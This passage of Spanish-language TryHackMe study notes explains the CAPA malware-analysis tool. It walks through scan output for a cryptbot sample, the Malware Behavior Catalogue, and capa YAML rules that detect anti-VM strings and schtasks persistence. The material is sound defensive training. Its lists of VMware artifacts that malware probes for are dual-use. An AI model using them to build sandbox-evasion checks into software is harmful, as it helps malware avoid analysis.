/vmmemctl\\.sys/i\n      - string: /vmx86\\.sys/i\n      - string: /vmrawdsk\\.sys/i\n      - string: /vmusbmouse\\.sys/i\n      - string: /vmkdb\\.sys/i\n      - string: /vmnetuserif\\.sys/i\n      - string: /vmnetadapter\\.sys/i\n      - string: /\\\\\\\\.\\\\HGFS/i\n      - string: /\\\\\\\\.\\\\vmci/i\n      - string: /vmtoolsd\\.exe/i\n      - string: /vmwaretray\\.exe/i\n      - string: /vmwareuser\\.exe/i\n      - string: /VGAuthService\\.exe/i\n      - string: /vmacthlp\\.exe/i\n      - string: /vmci/i\n        description: VMWare VMCI Bus Driver\n      - string: /vmhgfs/i\n        description: VMWare Host Guest Control Redirector\n      - string: /vmmouse/i\n      - string: /vmmemctl/i\n        description: VMWare Guest Memory Controller Driver\n      - string: /vmusb/i\n      - string: /vmusbmouse/i\n      - string: /vmx_svga/i\n      - string: /vmxnet/i\n      - string: /vmx86/i\n      - string: /VMwareVMware/i\n      - string: /vmGuestLib\\.dll/i\n      - string: /vmGuestLib\\.dll/i\n      - string: /Applications\\\\VMwareHostOpen\\.exe/i\n      - string: /vm3dgl\\.dll/i\n      - string: /vmdum\\.dll/i\n      - string: /vm3dver\\.dll/i\n      - string: /vmtray\\.dll/i\n      - string: /VMToolsHook\\.dll/i\n      - string: /vmmousever\\.dll/i\n      - string: /VmGuestLibJava\\.dll/i\n      - string: /vmscsi\\.sys/i\n```\n\n¿Lo viste? Bajo la funcionalidad \"**string: /VMWare/i**\" fue referenciado por CAPA Web Explorer. Simplemente CAPA diciendo que bajo ese namespace, pudimos identificar strings con el valor **VMWare** usando las condiciones en la regla y con regex.\n\nVeamos otro ejemplo. Sabemos que la capability fue **scheduled tasks via schtasts**, y que el archivo de regla fue **scheduled-tasks-via-schtasks.yml**.\n\n![[Pasted image 20251028152213.png]]\n\nLo mismo aplica que a nuestro primer ejemplo, nos centraremos en las features ya que es lo que CAPA usa para detectar coincidencias:\n\n```powershell\nrule:\n  meta:\n    name: schedule task via schtasks\n    namespace: persistence/scheduled-tasks\n    authors:\n      - 0x534a@mailbox.org\n    scopes:\n      static: function\n      dynamic: thread\n    att&ck:\n      - Persistence::Scheduled Task/Job::Scheduled Task [T1053.005]\n    examples:\n      - 79cde1aa711e321b4939805d27e160be:0x401440\n  features:\n    - and:\n      - match: host-interaction/process/create\n      - or:\n        - and:\n          - string: /schtasks/i\n          - string: /\\/create /i\n        - string: /Register-ScheduledTask /i\n```\n\nBajo las funcionalidades \"**string: /schtasks/i**\" y \"**string: /\\/create/i**\" fueron referenciadas en CAPA Web Explorer. Simplemente CAPA diciendo que bajo este namespace, y usando las condiciones en la regla y regex, pudo identificar strings con un valor de **schtasks** y **create**.\n\n---------------------------\n<h2>Caja de Búsqueda Global</h2>\nOtra funcionalidad guay de esta herramienta es poder filtrar y la búsqueda global.\n\n![[Pasted image 20251028152712.png]]\n\nEs mucho más rápido el análisis de esta información usando CAPA Web Explorer que cualquier editor de texto."
  },
  {
    "title": "2. Tool Overview - How CAPA Works",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/2-tool-overview-how-capa-works/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/2. Tool Overview - How CAPA Works.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea veremos cómo usar CAPA. Para ejecutar la herramienta, primero abrimos Powershell, después nos tenemos que asegurar de estar en el directorio adecuado (`C:\\Users\\Administrator\\Desktop\\capa`). Luego tenemos que ejecutar `capa` o `capa.exe` y apuntar al binario. En este ejemplo usaremos **cryptbot.bin**.\n\nDespués de ejecutar el comando, esperamos el resultado que puede tardar varios minutos.\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa.exe .\\cryptbot.bin\nloading : 100%|████████████████████| 485/485 [00:00<00:00, 1108.84     rules/s]\n/ analyzing program...\n```\n\nAdemás del comando `-h`, el cual nos da más información sobre los parámetros disponibles con la herramienta, dispondremos de los dos parámetros más usados, que son `-v` y `-vv`, los cuales nos darán información detallada del resultado.\n\n| Opción                | Descriptción                         | Sintaxis de Ejemplo           |\n| --------------------- | ------------------------------------ | ----------------------------- |\n| `-h` or `--help`      | Mostrar un mensaje de ayuda y salir. | `capa -h`                     |\n| `-v` or `--verbose`   | Habilitar verbose para la salida.    | `capa.exe .\\cryptbot.bin -v`  |\n| `-vv` or `--vverbose` | Habilitar más verbosidad             | `capa.exe .\\cryptbot.bin -vv` |\nEste debería ser el output del comando:\n\n```Powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> capa .\\cryptbot.bin\n┌─────────────┬─────────────────────────────────────────────────────────────────┐\n│ md5         │ 3b9d26d2e7433749f2c32edb13a2b0a2                                │\n│ sha1        │ 969437df8f4ad08542ce8fc9831fc49a7765b7c5                        │\n│ sha256      │ ae7bc6b6f6ecb206a7b957e4bb86e0d11845c5b2d9f7a00a482bef63b567ce4c│\n│ analysis    │ static                                                          │\n│ os          │ windows                                                         │\n│ format      │ pe                                                              │\n│ arch        │ i386                                                            │\n│ path        │ /home/strategos/Room-CAPA/cryptbot.bin                          │\n└─────────────┴─────────────────────────────────────────────────────────────────┘\n┌──────────────────────┬────────────────────────────────────────────────────────┐\n│ ATT&CK Tactic        │ ATT&CK Technique                                       │\n├──────────────────────┼────────────────────────────────────────────────────────┤\n│ DEFENSE EVASION      │ Obfuscated Files or Information [T1027]                │\n│                      │ Obfuscated Files or I...Removal from Tools [T1027.005] │\n│                      │ Virtualization/Sandbox Evasion::System Checks[T1497.001│\n│ DISCOVERY            │ File and Directory Discovery [T1083]                   │\n│ EXECUTION            │ Command and Scripting Interpreter::PowerShell [T1059.00│\n│                      │ Shared Modules [T1129]                                 │\n│ IMPACT               │ Resource Hijacking [T1496]                             │\n│ PERSISTENCE          │ Scheduled Task/Job::At [T1053.002]                     │\n│                      │ Scheduled Task/Job::Scheduled Task [T1053.005]         │\n└──────────────────────┴────────────────────────────────────────────────────────┘\n┌─────────────────────────────┬─────────────────────────────────────────────────┐\n│ MAEC Category               │ MAEC Value                                      │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ malware-category            │ launcher                                        │\n└─────────────────────────────┴─────────────────────────────────────────────────┘\n┌──────────────────────────┬────────────────────────────────────────────────────┐\n│ MBC Objective            │ MBC Behavior                                       │\n├──────────────────────────┼────────────────────────────────────────────────────┤\n│ ANTI-BEHAVIORAL ANALYSIS │ Virtual Machine Detection [B0009]                  │\n│ ANTI-STATIC ANALYSIS     │ Executable Code Obfuscation::Argument Obfuscation  │\n│                          │ Executable Code Obfuscation::Stack Strings [B0032.0│\n│ COMMUNICATION            │ HTTP Communication [C0002]                         │\n│                          │ HTTP Communication::Read Header [C0002.014]        │\n│ DATA                     │ Check String [C0019]                               │\n│                          │ Encode Data::Base64 [C0026.001]                    │\n│                          │ Encode Data::XOR [C0026.002]                       │\n│ DEFENSE EVASION          │ Obfuscated Files or Information::Encoding-Standard │\n│ DISCOVERY                │ File and Directory Discovery [E1083]               │\n│ EXECUTION                │ Command and Scripting Interpreter [E1059]          │\n│ FILE SYSTEM              │ Create Directory [C0046]                           │\n│                          │ Delete File [C0047]                                │\n│                          │ Read File [C0051]                                  │\n│                          │ Writes File [C0052]                                │\n│ MEMORY                   │ Allocate Memory [C0007]                            │\n│ PROCESS                  │ Create Process [C0017]                             │\n└──────────────────────────┴────────────────────────────────────────────────────┘\n┌──────────────────────────────────────────────────────┬────────────────────────┐\n│ Capability                                           │ Namespace              │\n├──────────────────────────────────────────────────────┼────────────────────────┤\n│ reference anti-VM strings                            │ anti-analysis/anti-vm/v│\n│ reference anti-VM strings targeting VMWare           │ anti-analysis/anti-vm/v│\n│ reference anti-VM strings targeting VirtualBox       │ anti-analysis/anti-vm/v│\n│ contain obfuscated stackstrings (2 matches)          │ anti-analysis/obfuscati│\n│ reference HTTP User-Agent string                     │ communication/http     │\n│ check HTTP status code                               │ communication/http/clie│\n│ reference Base64 string                              │ data-manipulation/encod│\n│ encode data using XOR                                │ data-manipulation/encod│\n│ contain a thread local storage (.tls) section        │ executable/pe/section/t│\n│ get common file path                                 │ host-interaction/file-s│\n│ create directory                                     │ host-interaction/file-s│\n│ delete file                                          │ host-interaction/file-s│\n│ read file on Windows (4 matches)                     │ host-interaction/file-s│\n│ write file on Windows (5 matches)                    │ host-interaction/file-s│\n│ get thread local storage value                       │ host-interaction/proces│\n│ create process on Windows                            │ host-interaction/proces│\n│ allocate or change RWX memory                        │ host-interaction/proces│\n│ reference cryptocurrency strings                     │ impact/cryptocurrency  │\n│ link function at runtime on Windows (5 matches)      │ linking/runtime-linking│\n│ parse PE header (4 matches)                          │ load-code/pe           │\n│ resolve function by parsing PE exports (186 matches) │ load-code/pe           │\n│ run PowerShell expression                            │ load-code/powershell/  │\n│ schedule task via at                                 │ persistence/scheduled-t│\n│ schedule task via schtasks                           │ persistence/scheduled-t│\n└──────────────────────────────────────────────────────┴────────────────────────┘\n```\n\nYa que sabemos que el tiempo de procesado es de varios minutos, hemos pre-procesado esto en un archivo llamado cryptbot.txt, localizado en `C:\\Users\\Administrator\\Desktop\\capa`. En otra Powershell escribe `Get-Content cryptbot.txt`:\n\n```powershell\nPS C:\\Users\\Administrator\\Desktop\\capa> Get-Content .\\cryptbot.txt\n```\n\nAl hacer esto obtendrás el mismo output que si realizaras el escaneo.\n\n"
  },
  {
    "title": "4. Dissecting CAPA Results Part 2 - Malware Behavior Catalogue",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/4-dissecting-capa-results-part-2-malware-behavior-catalogue/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/4. Dissecting CAPA Results Part 2 - Malware Behavior Catalogue.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea cubriremos los siguientes tópicos:\n\n- MBC\n- Objective\n- Micro-Objective\n- MBC Behaviours\n- Micro-Behaviour\n- Methods\n\n```powershell\n┍━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┯━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑\n│ MBC Objective               │ MBC Behavior                                    │\n┝━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┿━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┥\n│ ANTI-BEHAVIORAL ANALYSIS    │ Virtual Machine Detection [B0009]               |\n├─────────────────────────────┼───────────────────────────────━─────────────────┤\n│ ANTI-STATIC ANALYSIS        │ Executable Code Obfuscation::Argument           |\n|                             | Obfuscation [B0032.020]                         |\n│                             │ Executable Code Obfuscation::Stack Strings      │\n|                             | [B0032.017]                                     |\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ COMMUNICATION               │ HTTP Communication [C0002]                      |\n│                             │ HTTP Communication::Read Header [C0002.014]     │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ DATA                        │ Check String [C0019]                            |\n│                             │ Encode Data::Base64 [C0026.001]                 |\n│                             │ Encode Data::XOR [C0026.002]                    |\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ DEFENSE EVASION             │ Obfuscated Files or Information::Encoding-      |\n|                             | Standard Algorithm [E1027.m02]                  |\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ DISCOVERY                   │ File and Directory Discovery [E1083]            │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ EXECUTION                   │ Command and Scripting Interpreter [E1059]       │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ FILE SYSTEM                 │ Create Directory [C0046]                        │\n│                             │ Delete File [C0047]                             │\n│                             │ Read File [C0051]                               │\n│                             │ Writes File [C0052]                             │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ MEMORY                      │ Allocate Memory [C0007]                         │\n├─────────────────────────────┼─────────────────────────────────────────────────┤\n│ PROCESS                     │ Create Process [C0017]                          │\n┕━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┷━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┙\n```\n\nAfrontaremos el Catálogo de Comportamiento de Malware (Malware Behavior Catalogue MBC) para entender mejor el bloque de arriba.\n\n---------------------------\n<h2>Malware Behavior Catalogue (MBC)</h2>\nMBC está diseñado para soportar varios aspectos del análisis de malware, como etiquetación, análisis de similaridad y reporte estandarizado. Sirve como un catálogo de los objetivos y comportamientos del malware. También puede relacionar métodos ATT&CK y registrar comportamientos y funcionalidades de código descubiertas durante el análisis. Es importante recalcar que los nombres de los comportamientos MBC pueden, o no, corresponder con técnicas ATT&CK.\n\nEl contenido de MBC se puede representar en dos formatos:\n\n| Formato                                                 | Ejemplo                                                                             | Explicación                                                                                                                                                         |\n| ------------------------------------------------------- | ----------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **OBJECTIVE**::**Behavior**::**Method**[**Identifier**] | ANTI-STATIC ANALYSIS::Executable Code Obfuscation::Argument Obfuscation [B0032.020] | **Anti-static Analysis** = OBJETIVO  <br>**Executable Code Obfuscation** = COMPORTAMIENTO  <br>**Argument Obfuscation** = MÉTODO  <br>**BOO32.020** = IDENTIFICADOR |\n| **OBJECTIVE**::**Behavior**::[**Identifier**]           | COMMUNICATION::HTTP Communication:: [C0002]                                         | **COMMUNICATION** = OBJETIVO  <br>**HTTP Communication** = COMPORTAMIENTO  <br>**C0002** = IDENTIFICADOR                                                            |\n\nLa diferencia entre los dos formatos es que el primer formato contiene detalles adicionales  (método, que también se puede acuñar como sub-técnica).\n\n---------------------------------------\n<h2>Objetivo</h2>\nEl objetivo se basa en las tácticas ATT&CK en el contexto del comportamiento del malware. Además, MBC tiene análisis anti-comportamiento y anti-estático. Estos objetivos están diseñados para el análisis de malware con el caso de uso de \"**characterizing malware**\". En la tabla de abajo hay una explicación de cada una.\n\n| **Objective**                | **Explanation**                                                                                                                                                      |\n| ---------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| **Anti-Behavioral Analysis** | El malware intenta evitar la detección obstaculizando el análisis con herramientas como entornos sandbox o depuradores.                                              |\n| **Anti-Static Analysis**     | El malware intenta obstruir o añadir complejidad a los análisis estáticos haciendo más difícil para los analistas entender el código.                                |\n| **Collection**               | El malware se enfoca en identificar y recopilar información de la máquina o red objetivo.                                                                            |\n| **Command and Control**      | El malware suele establecer comunicación mediante métodos como servidores C2, , redes P2P, etc. Esto permite a los atacantes controlar los sistemas comprometidos.   |\n| **Credential Access**        | El objetivo principal del malware es robar credenciales, como contraseñas y nombres de usuario.                                                                      |\n| **Defense Evasion**          | El malware intenta bypassear y circunvalar los varios sistemas de detección y medidas de seguridad para evitar ser detectado.                                        |\n| **Discovery**                | El malware busca recolectar información detallada sobre la configuración y setup del sistema o la red en cuestión (incluyendo software, hardware e infraestructura). |\n| **Execution**                | El malware está diseñado para ejecutar comandos o código no autorizados en la máquina de la víctima sin su consentimiento.                                           |\n| **Exfiltration**             | Está diseñado para infiltrarse en sistemas o redes y robar y extraer información sensible.                                                                           |\n| **Impact**                   | Intenta manipular, modificar o dañar sistemas o información.                                                                                                         |\n| **Lateral Movement**         | Busca expandirse a través de la red, pasiva o activamente.                                                                                                           |\n| **Persistence**              | Diseñado específicamente con la capacidad de permanecer in detectado y operativo en un sistema durante un periodo extenso de tiempo.                                 |\n| **Privilege Escalation**     | Busca infiltrarse en un sistema o red para ganar privilegios elevados                                                                                                |\n\n-----------------------------------\n<h2>Micro-Objetivos</h2>\nSe asocian con los micro-comportamientos, que se refieren a acciones exhibidas por software potencialmente malicioso que no necesariamente lo es y puede servir para otros objetivos. Sin embargo es importante recalcar que estos comportamientos pueden ser abusados. Es por esto que CAPA puede marcarlos como positivos.\n\n| **Micro-Objectivo** | **Descripción**                                                                                                                       |\n| ------------------- | ------------------------------------------------------------------------------------------------------------------------------------- |\n| **PROCESS**         | Exhibir comportamientos como, pero no limitados a, crear procesos, configurar contexto de hilos, terminar procesos y comprobar mutex. |\n| **MEMORY**          | Exhibir comportamientos como, pero no limitados a, asignar memoria, cambiar protección de memoria y liberar memoria.                  |\n| **COMMUNICATION**   | Exhibir comportamientos como, pero no limitados a, tráfico (DNS, FTP, HTTP, ICMP, SMTP).                                              |\n| **DATA**            | Exhibir comportamientos como, pero no limitados a, comprobar strings, comprimir, codificar y descodificar información.                |\n\nEl output final de CAPA, Objetivo y Micro-Objetivo se muestra sólo debajo de la columna **Objective**.\n\n----------------------------------\n<h2>Comportamientos MBC</h2>\nLa columna MBC Behaviors contiene los comportamientos y micro-comportamientos con o sin sus métodos e identificadores. Puedes ver una lista de todo el contenido MBC [aquí](https://github.com/MBCProject/mbc-markdown/blob/main/mbc_summary.md).\n\nAquí debajo mostramos la versión comprimida de los comportamientos, micro-comportamientos e identificadores.\n\n| **Objectivo**                         | **Comportamiento**                    | Identificador | Explicación                                                                                                                     |\n| ------------------------------------- | ------------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------- |\n| ANTI-BEHAVIORAL ANALYSIS              | **Virtual Machine Detection**         | **B0009**     | El malware comprueba si está corriendo en un entorno virtual. Durante este proceso examina artefactos del usuario y el sistema. |\n| ANTI-STATIC ANALYSIS                  | **Executable Code Obfuscation**       | **B0032**     | Código ejecutable ha sido obscurizado para obstaculizar el análisis del código.                                                 |\n| EXECUTION                             | **Command and Scripting Interpreter** | **E1059**     | El malware puede explotar intérpretes de comandos y scripts para ejecutar comandos, scripts o binarios.                         |\n| DISCOVERY                             | **File and Directory Discovery**      | **E1083**     | El malware tiene la capacidad de buscar archivos específicos enumerando archivos y directorios.                                 |\n| ANTI-STATIC ANALYSIS, DEFENSE EVASION | **Obfuscated Files or Information**   | **E1027**     | El malware puede ofuscar archivos encodeando o encriptando.                                                                     |\n\n----------------------------------------\n<h2>Micro-Comportamientos</h2>\nEl término \"low-level behaviors\" en el análisis de malware se refiere a acciones exhibidas por malware que no son necesariamente maliciosas y pueden servir otros propósitos. Es importante recalcar que no porque un comportamiento esté categorizado como micro-comportamiento es inofensivo.\n\n| Micro-Objetivo | Micro-Comportamiento   | Identificador | Explicación                                                                                                                                             |\n| -------------- | ---------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| MEMORY         | **Allocate Memory**    | **C0007**     | El malware frecuentemente utiliza asignación de memoria como parte de su estrategia para desempaquetarse y ejecutar actividades maliciosas.             |\n| PROCESS        | **Create Process**     | **C0017**     | El malware crea un proceso mediante WMI  shellcode. También puede crear un proceso suspendido (segundo plano).                                          |\n| COMMUNICATION  | **HTTP Communication** | **C0002**     | El malware es capaz de iniciar comunicaciones HTTP.                                                                                                     |\n| DATA           | **Check String**       | **C0019**     | El malware puede inspeccionar una string para identificar características como contenido ASCII, números de tarjetas de crédito y longitud de la string. |\n| DATA           | **Encode Data**        | **C0026**     | El malware tiene la capacidad de encodear información usando Base64 o XOR.                                                                              |\n| FILE SYSTEM    | **Create Directory**   | **C0046**     | El malware puede crear un directorio.                                                                                                                   |\n| FILE SYSTEM    | **Delete File**        | **C0047**     | El malware tiene la capacidad de borrar un archivo.                                                                                                     |\n| FILE SYSTEM    | **Read File**          | **C0051**     | El malware puede leer un archivo.                                                                                                                       |\n| FILE SYSTEM    | **Writes File**        | **C0052**     | El malware tiene la capacidad de escribir un archivo.                                                                                                   |\n\nEL output final de CAPA, Comportamiento y Micro-Comportamiento se muestran sólo debajo de la columna **Behavior**.\n\n-------------------------------\n<h2>Métodos</h2>\nPor último, miraremos los Métodos. Debajo están algunos de los métodos incluidos en los resultados del ejemplo anterior. Los métodos están relacionados con los comportamientos.\n\n| Comportamiento                  | Método o sub-técnica            | Identificador | Explicación                                                                                                         |\n| ------------------------------- | ------------------------------- | ------------- | ------------------------------------------------------------------------------------------------------------------- |\n| Executable Code Obfuscation     | **Argument Obfuscation**        | B0032.020     | Números simples o argumentos de string se calculan en el momento de la ejecución, haciendo más difícil el análisis. |\n| Executable Code Obfuscation     | **Stack Strings**               | B0032.017     | Construir y descifrar strings en el stack en cada uso y después descartarlas para evitar futuras referencias        |\n| HTTP Communication              | **Read Header**                 | C0002.014     | Header de lectura HTTP.                                                                                             |\n| Encode Data                     | **Base64**                      | C0026.001     | El malware podría codificar información en Base64.                                                                  |\n| Encode Data                     | **XOR**                         | C0026.002     | El malware podría usar XOR para codificar la información.                                                           |\n| Obfuscated Files or Information | **Encoding-Standard Algorithm** | E1027.m02     | Codificar pruebas de malware, archivos u otra información usa un algoritmo estándar (ej: Base64).                   |\n\nAhora que tenemos una vista y entendimiento amplios de los contenidos MBC, deberíamos ser capaces de explicar el resultado del ejemplo anterior. Vamos a hacer un repaso usando uno de los resultados:\n\n```powershell\n┌─────────────────────────────┬──────────────────────────────────┐\n│ MBC Objective               │ MBC Behavior                     │\n├─────────────────────────────┼──────────────────────────────────┤\n| DATA                        │ Encode Data::Base64 [C0026.001]  │\n└─────────────────────────────┴──────────────────────────────────┘\n```\n\n| Etiqueta      | Valor           | Explicación                                                                                                            |\n| ------------- | --------------- | ---------------------------------------------------------------------------------------------------------------------- |\n| MBC Objective | **DATA**        | Exhibir comportamientos como, pero no limitados a, comprobar strings, comprimir, codificar y descodificar información. |\n| MBC Behavior  | **Encode Data** | Tiene la habilidad para codificar información usando Base64 y XOR.                                                     |\n| Method        | **Base64**      | El malware podría encodear información usando Base64.                                                                  |\n| Identifier    | **C0026.001**   | Da información sobre el comportamiento. También sirve como etiqueta.                                                   |\nSabiendo estas información puedes decir que el archivo puede usar un esquema de codificación Base64.\n\n"
  },
  {
    "title": "6. Dissecting CAPA Results Part 4 - Capability",
    "path": "/apuntes/thm/0-pre-career/2-cyber-security-101/12-defensive-security-tooling/2-capa-the-basics/6-dissecting-capa-results-part-4-capability/",
    "src": "content/Ciberseguridad/THM/0. Pre Career/2. Cyber Security 101/12. Defensive Security Tooling/2. CAPA - The Basics/6. Dissecting CAPA Results Part 4 - Capability.md",
    "breadcrumb": "THM > 0. Pre Career > 2. Cyber Security 101 > 12. Defensive Security Tooling > 2. CAPA - The Basics",
    "content": "En esta tarea continuaremos con el tema de la tarea pasada.\n\n----------------------------\n<h2>Capabilities</h2>\nDebajo hay una tabla con las capacidades (capabilities) y sus TLN, namespaces y reglas relacionados:\n\n| Capability                                     | Top-Level Namespace (TLN)                                                                         | Namespaces            | Archivo Rule YAML                                                         | Notas                                                                                                                                                      |\n| ---------------------------------------------- | ------------------------------------------------------------------------------------------------- | --------------------- | ------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| reference anti-VM strings                      | [**Anti-Analysis**](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis)         | anti-vm/vm-detection  | reference-anti-vm-strings.yml                                             | Para comprobar las reglas bajo este namespace haz click [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis/anti-vm/vm-detection)  |\n| reference anti-VM strings targeting VMWare     | **Anti-Analysis**                                                                                 | anti-vm/vm-detection  | reference-anti-vm-strings-targeting-vmware.yml                            | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/anti-analysis/anti-forensic)        |\n| reference anti-VM strings targeting VirtualBox | **Anti-Analysis**                                                                                 | anti-vm/vm-detection  | reference-anti-vm-strings-targeting-virtualbox.yml                        | Puedes querer comprobar el TLN para más reglas                                                                                                             |\n| reference HTTP User-Agent string               | [**Communication**](https://github.com/MBCProject/capa-rules-1/tree/master/communication)         | http/client           | reference-http-user-agent-string.yml                                      | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/communication/http/client))         |\n| check HTTP status code                         | **Communication**                                                                                 | http                  | check-http-status-code.yml                                                | Para comprobar las reglas bajo este namespace haz click [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/communication/http)                  |\n| reference Base64 string                        | [**Data Manipulation**](https://github.com/MBCProject/capa-rules-1/tree/master/data-manipulation) | encoding/base64       | reference-base64-string.yml                                               | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/data-manipulation/encoding/base64)  |\n| encode data using XOR                          | **Data Manipulation**                                                                             | encoding/XOR          | encode-data-using-xor.yml                                                 | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/data-manipulation/encoding/xor)     |\n| contain a thread local storage (.tls) section  | [**Executable**](https://github.com/MBCProject/capa-rules-1/tree/master/executable)               | pe/section/tls        | contain-a-thread-local-storage-tls-section.yml                            | Puedes querer comprobar el TLN para más reglas                                                                                                             |\n| get common file path                           | [**Host-Interaction**](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction)   | file-system           | get-common-file-path.yml                                                  | Puedes querer comprobar el TLN para más reglas                                                                                                             |\n| create directory                               | **Host-Interaction**                                                                              | file-system/create    | create-directory.yml                                                      | Puedes querer comprobar el TLN para más reglas                                                                                                             |\n| delete file                                    | **Host-Interaction**                                                                              | file-system/delete    | delete-file.yml                                                           | Para comprobar las reglas bajo este namespace haz click [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/file-system/delete) |\n| read file on Windows                           | **Host-Interaction**                                                                              | file-system/read      | read-file-on-windows.yml                                                  | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/file-system/read)  |\n| write file on Windows                          | **Host-Interaction**                                                                              | file-system/write     | write-file-on-windows.yml                                                 | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/file-system/write) |\n| get thread local storage value                 | **Host-Interaction**                                                                              | process               | get-thread-local-storage-value.yml                                        | Esta regla se encuentra bajo **TLN [Nursery](https://github.com/mandiant/capa-rules/tree/master/nursery)**                                                 |\n| allocate or change RWX memory                  | **Host-Interaction**                                                                              | process/inject        | allocate-or-change-rwx-memory.yml                                         | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/process/inject)    |\n| create process on Windows                      | **Host-Interaction**                                                                              | process create        | create-process-on-windows.yml                                             | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/host-interaction/process/create)    |\n| reference cryptocurrency strings               | [**Impact**](https://github.com/MBCProject/capa-rules-1/tree/master/impact)                       | impact/cryptocurrency | reference-cryptocurrency-strings.yml                                      | This rule is found under **TLN [Nursery](https://github.com/mandiant/capa-rules/tree/master/nursery),** a staging ground for unpolished rules.             |\n| link function at runtime on Windows            | [**Linking**](https://github.com/MBCProject/capa-rules-1/tree/master/linking)                     | runtime-linking       | link-function-at-runtime-on-windows.yml                                   | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/linking/runtime-linking)            |\n| parse PE header                                | [**load-code**](https://github.com/MBCProject/capa-rules-1/tree/master/load-code)                 | load-code/pe          | parse-pe-header.yml  <br>  <br>resolve-function-by-parsing-pe-exports.yml | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/load-code/pe)                       |\n| resolve function by parsing PE exports         | [**load-code**](https://github.com/MBCProject/capa-rules-1/tree/master/load-code)                 | load-code/pe          | resolve-function-by-parsing-pe-exports.yml                                | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/load-code/pe)                       |\n| run PowerShell expression                      | [**load-code**](https://github.com/MBCProject/capa-rules-1/tree/master/load-code/powershell)      | load-code/PowerShell  | run-powershell-expression.yml                                             | Para comprobar las reglas bajo este namespace haz click  [aquí](https://github.com/MBCProject/capa-rules-1/tree/master/linking/runtime-linking)            |\n| schedule task via at                           | [**persistence**](https://github.com/MBCProject/capa-rules-1/tree/master/persistence)             | scheduled-tasks       | schedule-task-via-at.yml                                                  | Puedes querer comprobar el TLN para más reglas                                                                                                             |\n| schedule task via schtasks                     | [**persistence**](https://github.com/MBCProject/capa-rules-1/tree/master/persistence)             | scheduled-tasks       | schedule-task-via-schtasks.yml                                            | Puedes querer comprobar el TLN para más reglas                                                                                                             |\n\nPara explicar esto más en profundidad, veamos la primera capability en la tabla, \"**Reference anti-VM strings**\".\n\n- Nos damos cuenta de que las reglas relacionadas en formato YML son **reference-anti-vm-strings.yml**.\n- Esto está bajo en Namespace **anti-vm/vm-detection**.\n- Este a su vez está bajo el TLN **Anti-Analysis**.\n\nEsto nos dice que CAPA fue capaz de identificar que el software potencialmente malicioso busca claves de registro VM específicas y la presencia de herramientas VMWare y otros elementos relacionados con las VMs usando el archivo **reference-anti-vm-strings.yml**.\n\nVeamos otro ejemplo. Miremos a \"schedule tasks via schtasks\":\n\n- Nos damos cuenta de que las reglas relacionadas en YML  son **schedule-task-via-schtasks.yml**.\n- Esto está bajo el Namespace **scheduled-tasks**.\n- Ese a su vez está bajo el TLN **persistence**.\n\nEsto nos dice que CAPA pudo identificar comportamientos relacionados a la programación de tareas en un sistema operativo Windows usando **schedule-task-via-schtasks.yml**.\n\n¿Te has fijado en algo?\n\nEl ítem bajo Capability tiene el mismo nombre que el archivo YML bajo Rules, con la única adición de un guión entre los espacios. Esto es porque Capability es el nombre de la regla.\n\nAlgunas excepciones donde la Capability no  está localizada bajo su Namespace:\n\n- **reference 